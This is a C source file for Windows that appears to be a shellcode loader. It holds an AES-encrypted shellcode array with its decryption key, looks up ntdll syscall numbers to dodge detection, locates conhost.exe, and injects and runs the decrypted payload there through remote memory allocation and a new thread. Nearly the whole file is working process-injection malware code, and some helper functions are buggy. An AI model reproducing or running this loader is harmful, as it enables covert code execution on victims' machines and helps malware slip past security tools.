//________________/INCLUDES\__________________
#include <windows.h> 
#include <stdbool.h> 
#include <psapi.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <time.h>
#include <stdio.h>
#include <time.h>
#include <tchar.h>

//________________/SHELLCODE\__________________
char dk[] = { 0xd1, 0x5b, 0x25, 0x74, 0x84, 0x3, 0x13, 0xef, 0x4, 0xf0, 0x17, 0x7a, 0x8a, 0x1b, 0x55, 0xbd };
unsigned char sh[] = { 0x5c, 0x71, 0x14, 0x70, 0x68, 0xc4, 0x3e, 0x1b, 0x2, 0xcd, 0xe, 0x13, 0x64, 0xd, 0x8a, 0x3f, 0xef, 0x20, 0xd6, 0xc0, 0x9d, 0x32, 0x2e, 0xc9, 0xe0, 0x49, 0x98, 0xd8, 0xd9, 0x9d, 0x59, 0xda, 0xce, 0xd1, 0xcd, 0x25, 0xd5, 0x3a, 0x48, 0x41, 0x5c, 0x71, 0x3c, 0x53, 0x1f, 0x5f, 0x85, 0x97, 0x89, 0x32, 0x66, 0x66, 0x13, 0xd7, 0x76, 0x55, 0xe9, 0x4d, 0x34, 0x74, 0xf3, 0xa8, 0xb2, 0x59, 0x91, 0x7, 0x67, 0xfa, 0xa3, 0x32, 0x5, 0xa8, 0x72, 0xd, 0x49, 0x7a, 0xe, 0xa, 0xe1, 0xdc, 0xed, 0xda, 0x33, 0x63, 0x58, 0x37, 0xd0, 0x55, 0xf4, 0xc4, 0xae, 0xa3, 0xeb, 0x28, 0x2c, 0x1, 0x92, 0xa0, 0x89, 0xa9, 0xf2, 0xb8, 0x3a, 0x14, 0x84, 0x20, 0xa, 0x92, 0x14, 0xc8, 0x62, 0xad, 0x57, 0x1e, 0x1, 0xdf, 0x0, 0x80, 0x34, 0x66, 0x7, 0x74, 0x15, 0x1, 0x23, 0x55, 0x4f, 0x1d, 0x49, 0xbc, 0xf7, 0xe2, 0x8b, 0xf6, 0x23, 0xec, 0x5d, 0x3d, 0x3f, 0xc, 0xa8, 0x6b, 0xc, 0x70, 0x77, 0x9e, 0xa2, 0xd2, 0x98, 0xa5, 0x4f, 0xfe, 0x7e, 0x7, 0x3c, 0x18, 0x29, 0x64, 0xf2, 0x10, 0xdf, 0x34, 0xa1, 0x77, 0x9b, 0xfc, 0x60, 0xa0, 0xa7, 0xd4, 0x27, 0x71, 0x6d, 0xa3, 0xa, 0xe0, 0xf3, 0x4e, 0xf6, 0xc4, 0x69, 0x38, 0x69, 0xfa, 0x10, 0xd4, 0xf9, 0x8f, 0x98, 0x75, 0xf8, 0x4c, 0xea, 0xa, 0x68, 0x3f, 0x1f, 0xe3, 0xe6, 0xf2, 0x7f, 0xa1, 0x45, 0x74, 0x3f, 0xd8, 0x69, 0x9e, 0xd7, 0xfa, 0x2a, 0xe7, 0x30, 0xbb, 0x17, 0x6c, 0xec, 0x84, 0x66, 0xfe, 0x61, 0x19, 0xfa, 0xdc, 0x70, 0x22, 0x61, 0x1e, 0xc7, 0x6e, 0x74, 0x41, 0x78, 0x14, 0xe0, 0x16, 0xd7, 0x9d, 0x76, 0x2b, 0xc8, 0x99, 0xee, 0xea, 0x38, 0xd4, 0x23, 0xeb, 0x94, 0x71, 0x51, 0x53, 0x22, 0xa8, 0x43, 0x12, 0x48, 0x7d, 0xe0, 0xd0, 0x81, 0x91, 0x4c, 0xd8, 0xb, 0xe8, 0xe6, 0xc3, 0xf2, 0x96, 0x3e, 0xd4, 0xc0, 0xe4, 0xac, 0x97, 0x8a, 0x18, 0xd5, 0x3, 0xe6, 0x42, 0x21, 0x83, 0xbc, 0x54, 0x54, 0x0, 0xd3, 0x7c, 0xd7, 0xae, 0x90, 0xdd, 0x76, 0x4f, 0xff, 0x82, 0x9e, 0xa3, 0xde, 0x6d, 0x5b, 0xe1, 0x6, 0x50, 0xc9, 0xc2, 0x18, 0xf9, 0xba, 0x69, 0x57, 0xa9, 0x8, 0x32, 0x4d, 0x2f, 0xf7, 0x71, 0x90, 0xc3, 0x5, 0x7b, 0x69, 0xb6, 0x34, 0x1b, 0xf2, 0x89, 0x9f, 0xc5, 0x71, 0xc0, 0x3, 0x36, 0xa7, 0xdd, 0x1, 0xa1, 0x68, 0x66, 0x6b, 0x30, 0xf, 0xcb, 0xec, 0x6e, 0x41, 0x4f, 0xaa, 0xed, 0x15, 0x69, 0x98, 0xa6, 0x64, 0x32, 0x3a, 0xde, 0xb9, 0x33, 0xfb, 0x3d, 0x7f, 0xf, 0x86, 0xbb, 0xd1, 0x18, 0xad, 0xc7, 0xe4, 0xa9, 0x6e, 0x2d, 0xbf, 0x2, 0x98, 0x10, 0xa9, 0xcc, 0x71, 0x4f, 0x75, 0x9f, 0xc7, 0xca, 0xe, 0xf, 0x7, 0xb6, 0x9c, 0x64, 0x28, 0x3c, 0xf6, 0x53, 0x6b, 0xeb, 0x9f, 0xf3, 0x14, 0x1a, 0xa4, 0x5a, 0xfd, 0xea, 0x29, 0x91, 0xd6, 0x55, 0x40, 0x80, 0x5, 0x4d, 0x3, 0x2b, 0x26, 0x49, 0x0, 0x94, 0xd9, 0x50, 0x1, 0xff, 0x53, 0xf9, 0xca, 0x1a, 0x0, 0xbc, 0x21, 0x18, 0x8a, 0x9, 0x61, 0xa1, 0xf8, 0xd3, 0x9d, 0xe3, 0x8e, 0xc, 0xa9, 0xf1, 0x4e, 0x1f, 0xa4, 0x69, 0x3e, 0xcf, 0x27, 0x66, 0xe4, 0x75, 0xcc, 0xec, 0x90, 0xef, 0x20, 0x76, 0x4, 0x3, 0x78, 0xf, 0x5, 0xd3, 0x37, 0x43, 0xd7, 0x25, 0xc, 0x9b, 0x90, 0xd2, 0xc3, 0x34, 0x8e, 0xd9, 0x83, 0xb1, 0xb1, 0x22, 0xbf, 0x3f, 0xb2, 0x89, 0xf2, 0xc4, 0xb7, 0x10, 0xa9, 0x1f, 0x47, 0x3e, 0x93, 0x22, 0x20, 0x1, 0x85, 0xde, 0xa4, 0x39, 0x26, 0x41, 0x5d, 0x8, 0x20, 0x77, 0xe1, 0x93 };

//__________/GLOBAL DEFINITIONS AND VARS\__________
#define STATUS_SUCCESS (NTSTATUS)0x00000000L

DWORD g_NtOpenProcessSSN;
DWORD g_NtAllocateVirtualMemorySSN;
DWORD g_NtWriteVirtualMemorySSN;
DWORD g_NtProtectVirtualMemorySSN;
DWORD g_NtCreateThreadExSSN;
DWORD g_NtWaitForSingleObjectSSN;
DWORD g_NtFreeVirtualMemorySSN;
DWORD g_NtCloseSSN;

NTSTATUS STATUS; 
HANDLE hProcess, hThread = INVALID_HANDLE_VALUE;
//_________________/OPTIONS\________________
const bool debug = true; // SET TO FALSE WHEN DONE

#define DEBUG
#ifdef DEBUG
  #define POSITIVE(MSG, ...) printf("[+] "      MSG "\n", ##__VA_ARGS__)
  #define INFO(MSG, ...)     printf("[*] "      MSG "\n", ##__VA_ARGS__)
  #define NEGATIVE(MSG, ...) printf("[-] "      MSG "\n", ##__VA_ARGS__)
#endif
//_____________/NTAPI FUNCTIONS_____________
#define NT_FUNCTIONS
#ifdef NT_FUNCTIONS
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL};
#endif

//______________/MY FUNCTIONS\________________
void HEX(const BYTE* data, DWORD length) {

    //_________/JUST PRINTS HEX NICELY\________
    printf("\n");
    DWORD j = 1; 
    for (DWORD i = 0; i < length; i++, j++){ 
        printf("%02X ", data[i]);
        //sSleep(3);
        if (j == 18) {
            if (i < length){
                printf("\n");
                j = 0;
            }
        }
    }
    printf("\n");
}

int AES256(char * sh, DWORD sh_len, char * dk, size_t dk_len) {

    //_________________/START\__________________

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    //_________/GETS THE ALGORITHM FOR RSA AND AES\________
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
            if (debug == true){NEGATIVE("CryptAcquireContextW() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //______________/CREATES A HASH OBJECT\______________
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
            if (debug == true){NEGATIVE("CryptCreateHash() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //________/HASHES THE KEY FOR CORRECT SIZE IN DECRYTPION\________
    if (!CryptHashData(hHash, (BYTE*)dk, (DWORD)dk_len, 0)){
            if (debug == true){NEGATIVE("CryptHashData() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;              
    }

    //__________/CREATES SUITABLE AES_DECRYPTION KEY\___________
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            if (debug == true){NEGATIVE("CryptDeriveKey() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //__________/FINALLY ACTUAL DECRYPTION OF THE GIVEN BINARY\__________
    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, sh, &sh_len)){
            if (debug == true){NEGATIVE("CryptDecrypt() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //______/FREE MEMORY\______
    CryptReleaseContext(hProv, 0); CryptDestroyHash(hHash); CryptDestroyKey(hKey);
    if (debug == true){printf("\t\t\t\\___Binary was sucessfully decrypted\n");}
    return EXIT_SUCCESS;  
    
    //_________________/END\__________________
}

void Get_Sysnumber(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFunctionSSN) {
    /*-----------[SEEK SYSCALLS]-----------*/
    UINT_PTR NtFunctionAddress = 0;

    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        NEGATIVE("GetProcAddress[%ld]", GetLastError());
        return;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
    if (debug == true){
    INFO("[0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, *NtFunctionSSN, NtFunctionName);
    }
    return;
}

int New_Line(int count){
    //______/VERY COMPLICATED FUNCTION! STAY AWAY!\____
    for (int i; i < count; i++){
        printf("\n");
    }
}

int return_hProcess() {
    DWORD processes[1024];
    DWORD cbNeeded;
    unsigned int i;

    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        if (debug) NEGATIVE("EnumProcesses() failed");
        return EXIT_FAILURE;
    }

    DWORD cProcesses = cbNeeded / sizeof(DWORD);

    for (i = 0; i < cProcesses; i++) {
        if (processes[i] != 0 && processes[i] != 4) {
            int PID = processes[i];
            CLIENT_ID CID = {(HANDLE)PID, NULL};
            STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
            if (hProcess != NULL) {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    TCHAR szProcessName[MAX_PATH];
                    if (GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR))) {
                        if (_tcsicmp(szProcessName, TEXT("conhost.exe")) == 0) {
                            if (debug) POSITIVE("Found conhost.exe with PID: %lu", processes[i]);
                            CLIENT_ID CID = {(HANDLE)processes[i], NULL};
                            STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
                            if (STATUS == STATUS_SUCCESS) {
                                if (debug) printf("\t\t  \\___PID[%lu]{-%ld}, hProcess -> [0x%p]\n", processes[i], i, hProcess);
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
}

int main(void){
    //__________________/SOME VARS USED LATER\___________________
    HMODULE hNtdll;
    LPVOID rBuffer = NULL;
    SIZE_T sh_len = sizeof(sh);
    DWORD oldprotect = 0;
    SIZE_T bytes = 0;
    
    //__________________/GETS SSN\___________________
    hNtdll = GetModuleHandleW(L"NTDLL");

    Get_Sysnumber(hNtdll, "NtOpenProcess", &g_NtOpenProcessSSN);
    Get_Sysnumber(hNtdll, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtCreateThreadEx", &g_NtCreateThreadExSSN);
    Get_Sysnumber(hNtdll, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
    Get_Sysnumber(hNtdll, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtClose", &g_NtCloseSSN);
    
    //----[FUNCTION FOR PROCESS HANDLE]-----
    return_hProcess();
    //----[VIRTUAL ALLOC]-----
    STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &sh_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtAllocateVirtualMemory[%zu::BYTES] -> Error[0x%lx]", sh_len, STATUS); return EXIT_FAILURE;}} else {
        if (debug == true){POSITIVE("NtAllocateVirtualMemory[%zu::BYTES] -> Addr[0x%p]", sh_len, rBuffer);}
    }
    //----[CHANGE PERMS FOR BUFFER]-----
    STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &sh_len, PAGE_EXECUTE_READWRITE, &oldprotect);
        if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtProtectVirtualMemory[PAGE_READWRITE::PAGE_EXECUTE_READWRITE] -> Error[0x%lx]", STATUS); return EXIT_FAILURE;}} else {
            if (debug == true){POSITIVE("NtProtectVirtualMemory[PAGE_READWRITE::PAGE_EXECUTE_READWRITE] -> [STATUS_SUCCESS]");}
        }

    //----[RUNTIME AES DECRYPT]-----
    if (debug == true){INFO("AES runtime decryption started..."); Sleep(300);}
    AES256(sh, sizeof(sh), dk, sizeof(dk)); if (debug == true){HEX(sh, sizeof(sh));}

    //----[WRITES SH TO BUFFER]-----
    STATUS = NtWriteVirtualMemory(hProcess, rBuffer, sh, sh_len, &bytes);

    if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtWriteVirtualMemory[%zu::BYTES] -> Error[0x%lx]", bytes, STATUS);} return EXIT_FAILURE;} else {
            if (debug == true){POSITIVE("NtWriteVirtualMemory[%zu::BYTES] -> [STATUS_SUCCESS]", bytes);}}

    //----[CREATES A EXECUTION THREAD]-----
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);

    if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtCreateThreadEx[%zu::BYTES] -> Error[0x%lx]", bytes, STATUS);} return EXIT_FAILURE;} else {
            if (debug == true){POSITIVE("NtCreateThreadEx[(0x%p), (0x%p)] -> [%p]", hProcess, rBuffer, hThread);}}
    
    WaitForSingleObject(hThread, INFINITE);

    //----[CLEANUP]-----
    if (debug == true){INFO("[0x%p] Thread finished! Cleaning up memory..", hThread);}

    STATUS = NtFreeVirtualMemory(hProcess, &rBuffer, &sh_len, MEM_DECOMMIT);
    if (STATUS == STATUS_SUCCESS){
        if (debug == true){POSITIVE("[%zu::BYTES] cleared from rBuffer[0x%p]", sh_len, rBuffer);}
    } else {
        if (debug == true){NEGATIVE("Unable to clear memory in rBuffer[0x%p] -> Error[0x%lx]", rBuffer, STATUS);}
    }

    NtClose(hProcess); NtClose(hThread);
    return EXIT_SUCCESS;
}
